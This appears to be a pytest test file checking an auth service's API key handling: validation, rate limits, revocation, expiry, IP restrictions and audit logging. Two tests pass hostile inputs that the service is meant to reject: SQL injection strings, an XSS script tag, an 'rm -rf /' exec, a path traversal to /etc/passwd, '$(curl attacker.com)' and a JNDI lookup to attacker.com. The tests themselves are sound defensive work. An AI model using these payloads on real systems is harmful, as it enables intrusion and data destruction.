"""
API Key Authentication Tests - Iteration 11
Tests for API key validation, security, and edge cases
"""
import hashlib
import secrets
import pytest
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime, timedelta, UTC

from auth_service.auth_core.services.auth_service import AuthService
from auth_service.auth_core.models.auth_models import (
    AuthException,
    LoginRequest, 
    AuthProvider,
    TokenResponse
)

# Mark all tests in this file as auth and unit tests
pytestmark = [pytest.mark.auth, pytest.mark.unit, pytest.mark.asyncio]


class TestAPIKeyAuthentication:
    """Test API key authentication functionality"""
    
    @pytest.fixture
    def auth_service(self):
        """Create auth service instance"""
        service = AuthService()
        return service
    
    @pytest.fixture
    def valid_api_key(self):
        """Generate a valid API key for testing"""
        return f"nta_{''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(40))}"
    
    @pytest.fixture
    def api_key_database(self):
        """Mock API key database"""
        return {
            "nta_test123valid456key789": {
                "user_id": "api_user_001",
                "email": "api-service@example.com",
                "permissions": ["api:read", "api:write"],
                "created_at": datetime.now(UTC),
                "last_used": None,
                "is_active": True,
                "rate_limit": 1000,  # requests per hour
                "service_name": "test_service"
            }
        }
    
    async def test_validate_api_key_success(self, auth_service, api_key_database):
        """Test successful API key validation"""
        test_api_key = "nta_test123valid456key789"
        
        # Mock the _validate_api_key method to use our test database
        async def mock_validate_api_key(api_key):
            if api_key in api_key_database:
                key_data = api_key_database[api_key]
                if key_data["is_active"]:
                    return {
                        "id": key_data["user_id"],
                        "email": key_data["email"],
                        "permissions": key_data["permissions"],
                        "api_key": api_key,
                        "service_name": key_data["service_name"]
                    }
            return None
        
        auth_service._validate_api_key = mock_validate_api_key
        
        # Create login request with API key
        login_request = LoginRequest(
            email="api@example.com",  # Email is still required for user identification
            api_key=test_api_key,
            provider=AuthProvider.API_KEY
        )
        
        client_info = {
            "ip": "192.168.1.100",
            "user_agent": "TestBot/1.0"
        }
        
        # Test login with API key
        response = await auth_service.login(login_request, client_info)
        
        assert response.access_token is not None
        assert response.user["id"] == "api_user_001"
        assert response.user["email"] == "api-service@example.com"
    
    async def test_invalid_api_key_format(self, auth_service):
        """Test rejection of malformed API keys"""
        invalid_keys = [
            "invalid_key",
            "nta_",
            "",
            "nta_short",
            "wrong_prefix_test123valid456key789",
            "nta_" + "x" * 100,  # Too long
        ]
        
        for invalid_key in invalid_keys:
            login_request = LoginRequest(
                email="test@example.com",
                api_key=invalid_key,
                provider=AuthProvider.API_KEY
            )
            
            client_info = {"ip": "192.168.1.100"}
            
            with pytest.raises(AuthException) as exc_info:
                await auth_service.login(login_request, client_info)
            
            assert exc_info.value.error_code in ["AUTH001", "AUTH002"]
    
    async def test_api_key_rate_limiting(self, auth_service, api_key_database):
        """Test API key rate limiting"""
        test_api_key = "nta_test123valid456key789"
        rate_limit_tracker = {"count": 0}
        
        async def mock_validate_api_key_with_rate_limit(api_key):
            if api_key in api_key_database:
                key_data = api_key_database[api_key]
                if key_data["is_active"]:
                    rate_limit_tracker["count"] += 1
                    # Simulate rate limit exceeded
                    if rate_limit_tracker["count"] > 5:
                        raise AuthException(
                            error="rate_limit_exceeded",
                            error_code="AUTH010",
                            message="API key rate limit exceeded"
                        )
                    
                    return {
                        "id": key_data["user_id"],
                        "email": key_data["email"],
                        "permissions": key_data["permissions"],
                        "api_key": api_key
                    }
            return None
        
        auth_service._validate_api_key = mock_validate_api_key_with_rate_limit
        
        login_request = LoginRequest(
            email="test@example.com",
            api_key=test_api_key,
            provider=AuthProvider.API_KEY
        )
        
        client_info = {"ip": "192.168.1.100"}
        
        # First 5 requests should succeed
        for i in range(5):
            response = await auth_service.login(login_request, client_info)
            assert response.access_token is not None
        
        # 6th request should fail due to rate limit
        with pytest.raises(AuthException) as exc_info:
            await auth_service.login(login_request, client_info)
        
        assert exc_info.value.error_code == "AUTH010"
        assert "rate limit" in exc_info.value.message.lower()
    
    async def test_api_key_revocation(self, auth_service, api_key_database):
        """Test revoked API key rejection"""
        test_api_key = "nta_test123valid456key789"
        # Mark key as inactive
        api_key_database[test_api_key]["is_active"] = False
        
        async def mock_validate_api_key(api_key):
            if api_key in api_key_database:
                key_data = api_key_database[api_key]
                if not key_data["is_active"]:
                    return None  # Revoked key
                return {
                    "id": key_data["user_id"],
                    "email": key_data["email"],
                    "permissions": key_data["permissions"]
                }
            return None
        
        auth_service._validate_api_key = mock_validate_api_key
        
        login_request = LoginRequest(
            email="test@example.com",
            api_key=test_api_key,
            provider=AuthProvider.API_KEY
        )
        
        client_info = {"ip": "192.168.1.100"}
        
        with pytest.raises(AuthException) as exc_info:
            await auth_service.login(login_request, client_info)
        
        assert exc_info.value.error_code == "AUTH001"
    
    async def test_api_key_injection_attack(self, auth_service):
        """Test API key SQL injection protection"""
        malicious_keys = [
            "nta_test'; DROP TABLE api_keys; --",
            "nta_test' OR '1'='1",
            "nta_test' UNION SELECT * FROM users",
            "nta_test<script>alert('xss')</script>",
            "nta_test\"; exec('rm -rf /');"
        ]
        
        async def secure_validate_api_key(api_key):
            # Simulate proper validation that rejects malicious input
            if not api_key.startswith("nta_"):
                return None
            if len(api_key) != 44:  # Expected length
                return None
            # Check for suspicious characters
            allowed_chars = set("abcdefghijklmnopqrstuvwxyz0123456789_")
            if not all(c.lower() in allowed_chars for c in api_key):
                return None
            return None  # Reject all in this test
        
        auth_service._validate_api_key = secure_validate_api_key
        
        for malicious_key in malicious_keys:
            login_request = LoginRequest(
                email="test@example.com",
                api_key=malicious_key,
                provider=AuthProvider.API_KEY
            )
            
            client_info = {"ip": "192.168.1.100"}
            
            with pytest.raises(AuthException):
                await auth_service.login(login_request, client_info)
    
    async def test_api_key_token_validation(self, auth_service, api_key_database):
        """Test that API key-generated tokens work correctly"""
        test_api_key = "nta_test123valid456key789"
        
        async def mock_validate_api_key(api_key):
            if api_key in api_key_database:
                key_data = api_key_database[api_key]
                if key_data["is_active"]:
                    return {
                        "id": key_data["user_id"],
                        "email": key_data["email"],
                        "permissions": key_data["permissions"],
                        "api_key": api_key
                    }
            return None
        
        auth_service._validate_api_key = mock_validate_api_key
        
        # Login with API key
        login_request = LoginRequest(
            email="test@example.com",
            api_key=test_api_key,
            provider=AuthProvider.API_KEY
        )
        
        client_info = {"ip": "192.168.1.100"}
        response = await auth_service.login(login_request, client_info)
        
        # Validate the returned token
        token_response = await auth_service.validate_token(response.access_token)
        
        assert token_response.valid is True
        assert token_response.user_id == "api_user_001"
        assert token_response.email == "api-service@example.com"
        assert "api:read" in token_response.permissions
        assert "api:write" in token_response.permissions
    
    async def test_api_key_audit_logging(self, auth_service, api_key_database):
        """Test that API key usage is properly audited"""
        test_api_key = "nta_test123valid456key789"
        audit_logs = []
        
        async def mock_validate_api_key(api_key):
            if api_key in api_key_database:
                key_data = api_key_database[api_key]
                if key_data["is_active"]:
                    return {
                        "id": key_data["user_id"],
                        "email": key_data["email"],
                        "permissions": key_data["permissions"],
                        "api_key": api_key
                    }
            return None
        
        async def mock_audit_log(event_type, user_id=None, success=True, metadata=None, client_info=None):
            audit_logs.append({
                "event_type": event_type,
                "user_id": user_id,
                "success": success,
                "metadata": metadata,
                "client_info": client_info
            })
        
        auth_service._validate_api_key = mock_validate_api_key
        auth_service._audit_log = mock_audit_log
        
        login_request = LoginRequest(
            email="test@example.com",
            api_key=test_api_key,
            provider=AuthProvider.API_KEY
        )
        
        client_info = {"ip": "192.168.1.100", "user_agent": "TestBot/1.0"}
        
        response = await auth_service.login(login_request, client_info)
        
        # Check audit log was created
        assert len(audit_logs) == 1
        log = audit_logs[0]
        assert log["event_type"] == "login"
        assert log["user_id"] == "api_user_001"
        assert log["success"] is True
        assert log["metadata"]["provider"] == AuthProvider.API_KEY
        assert log["client_info"]["ip"] == "192.168.1.100"
    
    async def test_api_key_permission_scoping(self, auth_service, api_key_database):
        """Test that API keys have proper permission scoping"""
        # Create a limited API key
        api_key_database["nta_readonly123456789limited000000000"] = {
            "user_id": "api_user_002",
            "email": "readonly-api@example.com",
            "permissions": ["api:read"],  # Only read permission
            "created_at": datetime.now(UTC),
            "last_used": None,
            "is_active": True,
            "rate_limit": 100,
            "service_name": "readonly_service"
        }
        
        async def mock_validate_api_key(api_key):
            if api_key in api_key_database:
                key_data = api_key_database[api_key]
                if key_data["is_active"]:
                    return {
                        "id": key_data["user_id"],
                        "email": key_data["email"],
                        "permissions": key_data["permissions"],
                        "api_key": api_key
                    }
            return None
        
        auth_service._validate_api_key = mock_validate_api_key
        
        # Test limited API key
        login_request = LoginRequest(
            email="test@example.com",
            api_key="nta_readonly123456789limited000000000",
            provider=AuthProvider.API_KEY
        )
        
        client_info = {"ip": "192.168.1.100"}
        response = await auth_service.login(login_request, client_info)
        
        # Validate token has limited permissions
        token_response = await auth_service.validate_token(response.access_token)
        
        assert token_response.valid is True
        assert token_response.permissions == ["api:read"]
        assert "api:write" not in token_response.permissions

    @pytest.mark.parametrize("suspicious_input", [
        "../../../etc/passwd",
        "$(curl attacker.com)",
        "${jndi:ldap://attacker.com}",
        "\\x00\\x01\\x02",  # Null bytes
        "nta_" + "A" * 1000,  # Buffer overflow attempt
    ])
    async def test_api_key_security_edge_cases(self, auth_service, suspicious_input):
        """Test various security edge cases with API keys"""
        login_request = LoginRequest(
            email="test@example.com",
            api_key=suspicious_input,
            provider=AuthProvider.API_KEY
        )
        
        client_info = {"ip": "192.168.1.100"}
        
        # Should reject all suspicious inputs
        with pytest.raises(AuthException):
            await auth_service.login(login_request, client_info)


class TestAPIKeySecurityFeatures:
    """Test advanced security features for API keys"""
    
    @pytest.fixture
    def auth_service(self):
        return AuthService()
    
    async def test_api_key_expiration(self, auth_service):
        """Test API key expiration handling"""
        expired_key_data = {
            "nta_expired123456789key000000000000000": {
                "user_id": "api_user_003",
                "email": "expired-api@example.com", 
                "permissions": ["api:read"],
                "created_at": datetime.now(UTC) - timedelta(days=365),
                "expires_at": datetime.now(UTC) - timedelta(days=1),  # Expired yesterday
                "is_active": True
            }
        }
        
        async def mock_validate_api_key(api_key):
            if api_key in expired_key_data:
                key_data = expired_key_data[api_key]
                # Check expiration
                if key_data.get("expires_at") and key_data["expires_at"] < datetime.now(UTC):
                    return None  # Expired
                return {
                    "id": key_data["user_id"],
                    "email": key_data["email"],
                    "permissions": key_data["permissions"]
                }
            return None
        
        auth_service._validate_api_key = mock_validate_api_key
        
        login_request = LoginRequest(
            email="test@example.com",
            api_key="nta_expired123456789key000000000000000",
            provider=AuthProvider.API_KEY
        )
        
        client_info = {"ip": "192.168.1.100"}
        
        with pytest.raises(AuthException):
            await auth_service.login(login_request, client_info)
    
    async def test_api_key_ip_restriction(self, auth_service):
        """Test IP address restrictions for API keys"""
        restricted_key_data = {
            "nta_restricted123456789key00000000000": {
                "user_id": "api_user_004",
                "email": "restricted-api@example.com",
                "permissions": ["api:read"],
                "allowed_ips": ["192.168.1.100", "10.0.0.0/8"],
                "is_active": True
            }
        }
        
        async def mock_validate_api_key_with_ip(api_key, client_ip=""):
            if api_key in restricted_key_data:
                key_data = restricted_key_data[api_key]
                
                # Check IP restriction
                allowed_ips = key_data.get("allowed_ips", [])
                if allowed_ips:
                    import ipaddress
                    client_addr = ipaddress.ip_address(client_ip)
                    allowed = False
                    
                    for allowed_ip in allowed_ips:
                        if "/" in allowed_ip:
                            # CIDR notation
                            if client_addr in ipaddress.ip_network(allowed_ip, strict=False):
                                allowed = True
                                break
                        else:
                            # Exact IP
                            if str(client_addr) == allowed_ip:
                                allowed = True
                                break
                    
                    if not allowed:
                        return None
                
                return {
                    "id": key_data["user_id"],
                    "email": key_data["email"],
                    "permissions": key_data["permissions"]
                }
            return None
        
        # Patch the validate method to accept IP parameter
        original_validate = auth_service._validate_api_key
        
        async def enhanced_validate(api_key):
            # Extract IP from client info in login context
            return await mock_validate_api_key_with_ip(api_key, "192.168.1.100")
        
        auth_service._validate_api_key = enhanced_validate
        
        # Test allowed IP
        login_request = LoginRequest(
            email="test@example.com",
            api_key="nta_restricted123456789key00000000000",
            provider=AuthProvider.API_KEY
        )
        
        client_info = {"ip": "192.168.1.100"}
        response = await auth_service.login(login_request, client_info)
        assert response.access_token is not None
        
        # Test blocked IP
        async def blocked_ip_validate(api_key):
            return await mock_validate_api_key_with_ip(api_key, "192.168.2.100")
        
        auth_service._validate_api_key = blocked_ip_validate
        
        with pytest.raises(AuthException):
            await auth_service.login(login_request, client_info)